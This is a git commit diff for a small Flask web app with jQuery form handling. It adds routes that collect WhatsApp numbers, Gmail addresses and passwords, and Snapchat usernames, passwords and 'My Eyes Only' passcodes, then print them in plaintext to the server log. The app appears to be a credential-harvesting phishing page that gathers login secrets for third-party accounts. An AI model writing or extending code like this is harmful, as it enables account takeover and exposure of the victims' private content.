345832286e41dabd0a5cf9738807ac738914ee33
Divine Duah <divine.duah@amalitech.com>
2023-09-24 12:35:49 +0000

    add ajax form submission

--- app.py
+++ app.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, jsonify, request
 
 # create instance of the flask app
 app = Flask(__name__)
@@ -9,4 +9,37 @@ def index():
     return render_template("index.html")
 
 
+@app.route("/submit-whatsapp-credentials", methods=["POST"])
+def submit_whatsapp_credentials():
+    try:
+        whatsapp_number = request.form["whatsapp_number"]
+        whatsapp_country = request.form["whatsapp_country"]
+        print(whatsapp_number, whatsapp_country)
+        return jsonify({"message": "success"})
+    except Exception as e:
+        print(e)
+        return jsonify({"message": "error"})
 
+
+@app.route("/submit-gmail-credentials", methods=["POST"])
+def submit_gmail_credentials():
+    try:
+        email = request.form["email"]
+        password = request.form["password"]
+        print(email, password)
+        return jsonify({"message": "success"})
+    except Exception as e:
+        print(e)
+        return jsonify({"message": "error"})
+    
+@app.route("/submit-snapchat-credentials", methods=["POST"])
+def submit_snapchat_credentials():
+    try:
+        username = request.form["username"]
+        password = request.form["password"]
+        snapchat_code = request.form["snapchat_code"]
+        print(username, password, snapchat_code, "All my code")
+        return jsonify({"message": "success"})
+    except Exception as e:
+        print(e)
+        return jsonify({"message": "error"})
--- static/js/script.js
+++ static/js/script.js
@@ -1,24 +1,183 @@
-// JavaScript to show/hide the appropriate fields based on the selected option
-const selectField = document.getElementById("select-field");
-const whatsappFields = document.getElementById("whatsapp-fields");
-const gmailFields = document.getElementById("gmail-fields");
-const snapchatFields = document.getElementById("snapchat-fields");
+$(function () {
+  // JavaScript to show/hide the appropriate fields based on the selected option
+  const selectField = $("#select-field");
+  const whatsappFields = $("#whatsapp-fields");
+  const gmailFields = $("#gmail-fields");
+  const snapchatFields = $("#snapchat-fields");
 
-selectField.addEventListener("change", () => {
-  const selectedOption = selectField.value;
-  console.log(selectedOption);
-  console.log(whatsappFields, "Whatsapp ");
-  // Hide all fields initially
-  whatsappFields.style.display = "none";
-    gmailFields.style.display = "none";
-    snapchatFields.style.display = "none";
+  const myEyesOnlyCheckbox = $("#my-eyes-only");
+  const codeInput = $("#snapchat-code");
 
-  // Show the relevant fields based on the selected option
-  if (selectedOption === "WhatsApp") {
-    whatsappFields.style.display = "block";
-  } else if (selectedOption === "Gmail") {
-    gmailFields.style.display = "block";
-  } else if (selectedOption === "Snapchat") {
-    snapchatFields.style.display = "block";
+  myEyesOnlyCheckbox.on("change", function () {
+    // Enable or disable the snapchat code input field based on the checkbox state
+    if (this.checked) {
+      codeInput.prop("disabled", false);
+    } else {
+      codeInput.prop("disabled", true);
+    }
+  });
+
+  selectField.on("change", (e) => {
+    const selectedOption = selectField.val();
+    // Hide all fields initially
+    whatsappFields.hide();
+    gmailFields.hide();
+    snapchatFields.hide();
+
+    // Show the relevant fields based on the selected option
+    if (selectedOption === "WhatsApp") {
+      whatsappFields.show();
+    } else if (selectedOption === "Gmail") {
+      gmailFields.show();
+    } else if (selectedOption === "Snapchat") {
+      snapchatFields.show();
+    }
+  });
+
+  function validateWhatsAppCredentials(whatsAppNumber, whatsAppCountry) {
+    // Get the input fields
+    if (whatsAppNumber.val() && whatsAppCountry.val()) {
+      whatsAppNumber.removeClass("is-invalid");
+      whatsAppCountry.removeClass("is-invalid");
+      return true;
+    } else {
+      // show error message
+      if (!whatsAppNumber.val()) {
+        whatsAppNumber.addClass("is-invalid");
+      }
+      if (!whatsAppCountry.val()) {
+        whatsAppCountry.addClass("is-invalid");
+      }
+      return false;
+    }
   }
+  function validateGmailCredentials(email, password) {
+    // Get the input fields
+    if (email.val() && password.val()) {
+      email.removeClass("is-invalid");
+      password.removeClass("is-invalid");
+      return true;
+    } else {
+      // show error message
+      if (!email.val()) {
+        email.addClass("is-invalid");
+      }
+      if (!password.val()) {
+        password.addClass("is-invalid");
+      }
+      return false;
+    }
+  }
+
+  function validateSnapchatCredentials(username, password) {
+    // Get the input fields
+    if (myEyesOnlyCheckbox.is(":checked")) {
+      if (username.val() && password.val() && codeInput.val()) {
+        username.removeClass("is-invalid");
+        password.removeClass("is-invalid");
+        codeInput.removeClass("is-invalid");
+        return true;
+      } else {
+        // show error message
+        if (!username.val()) {
+          username.addClass("is-invalid");
+        }
+        if (!password.val()) {
+          password.addClass("is-invalid");
+        }
+        if (!codeInput.val()) {
+          codeInput.addClass("is-invalid");
+        }
+        return false;
+      }
+    } else {
+      if (username.val() && password.val()) {
+        username.removeClass("is-invalid");
+        password.removeClass("is-invalid");
+        return true;
+      } else {
+        // show error message
+        if (!username.val()) {
+          username.addClass("is-invalid");
+        }
+        if (!password.val()) {
+          password.addClass("is-invalid");
+        }
+        return false;
+      }
+    }
+  }
+
+  $("#form").submit((e) => {
+    e.preventDefault();
+    // submit form based on selected option
+    if (selectField.val() === "WhatsApp") {
+      const whatsAppNumber = $("#whatsapp-number");
+      const whatsAppCountry = $("#whatsapp-country");
+      // make sure the input fields for whatsApp are all filled
+      if (validateWhatsAppCredentials(whatsAppNumber, whatsAppCountry)) {
+        $.ajax({
+          data: {
+            whatsapp_number: whatsAppNumber.val(),
+            whatsapp_country: whatsAppCountry.val(),
+          },
+          type: "POST",
+          url: "/submit-whatsapp-credentials",
+        }).done(function (data) {
+          if (data.message === "success") {
+            console.log("Submission was a success");
+          } else if (data.message === "error") {
+            console.log("Submission was a failure");
+          }
+        });
+      }
+    }
+
+    // If Gmail is selected
+    if (selectField.val() === "Gmail") {
+      const email = $("#email");
+      const password = $("#gmail-password");
+      // make sure the input fields for Gmail are all filled
+      if (validateGmailCredentials(email, password)) {
+        $.ajax({
+          data: {
+            email: email.val(),
+            password: password.val(),
+          },
+          type: "POST",
+          url: "/submit-gmail-credentials",
+        }).done(function (data) {
+          if (data.message === "success") {
+            console.log("Submission was a success");
+          } else if (data.message === "error") {
+            console.log("Submission was a failure");
+          }
+        });
+      }
+    }
+
+    // If Snapchat is selected
+    if (selectField.val() === "Snapchat") {
+      const username = $("#snapchat-username");
+      const password = $("#snapchat-password");
+      // make sure the input fields for Snapchat are all filled
+      if (validateSnapchatCredentials(username, password)) {
+        $.ajax({
+          data: {
+            username: username.val(),
+            password: password.val(),
+            snapchat_code: codeInput.val(),
+          },
+          type: "POST",
+          url: "/submit-snapchat-credentials",
+        }).done(function (data) {
+          if (data.message === "success") {
+            console.log("Submission was a success");
+          } else if (data.message === "error") {
+            console.log("Submission was a failure");
+          }
+        });
+      }
+    }
+  });
 });
